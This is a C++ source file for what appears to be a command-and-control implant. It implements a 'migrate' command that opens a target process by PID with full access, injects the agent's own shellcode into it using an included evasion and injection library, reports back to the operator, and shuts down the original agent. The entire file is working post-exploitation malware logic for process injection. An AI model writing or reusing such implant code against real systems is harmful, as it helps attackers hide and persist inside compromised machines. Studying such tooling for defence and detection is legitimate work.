#include <common.h>
#include <commands.h>
#include <package.h>
#include <parser.h>
#include <config.h>
#include <strings.h>

#ifdef INCLUDE_CMD_MIGRATE

using namespace stardust;
using namespace starburst;

#include <evasion/injection_techniques.h>

auto declfn starburst::cmd_migrate(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {
    uint32_t pid = parser_int32( params );
    if ( pid == 0 ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "invalid PID" ) ) );
        return;
    }

    DBG_PRINT( inst, "cmd_migrate: target pid=%u\n", pid );

    HANDLE h_proc = inst.kernel32.OpenProcess( PROCESS_ALL_ACCESS, FALSE, pid );
    if ( !h_proc ) {
        char msg[80] = { 0 };
        str_copy( msg, symbol<char*>( const_cast<char*>( "OpenProcess failed for PID " ) ) );
        char num[16];
        int_to_str( num, pid, 10 );
        str_concat( msg, num );
        queue_response( inst, task_uuid, RESPONSE_ERROR, msg );
        return;
    }

    auto sc_base = reinterpret_cast<void*>( inst.base.address );
    auto sc_len  = static_cast<uint32_t>( inst.base.length );

    if ( !sc_base || sc_len == 0 ) {
        inst.kernel32.CloseHandle( h_proc );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "agent base/length not set" ) ) );
        return;
    }

    HANDLE h_thread = inject_shellcode( inst, h_proc, sc_base, sc_len );

    if ( !h_thread ) {
        inst.kernel32.CloseHandle( h_proc );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "injection failed" ) ) );
        return;
    }

    inst.kernel32.CloseHandle( h_thread );
    inst.kernel32.CloseHandle( h_proc );

    char msg[80] = { 0 };
    str_copy( msg, symbol<char*>( const_cast<char*>( "migrated to PID " ) ) );
    char num[16];
    int_to_str( num, pid, 10 );
    str_concat( msg, num );

    queue_response( inst, task_uuid, RESPONSE_SUCCESS, msg );

    inst.agent.running = false;
}

#endif
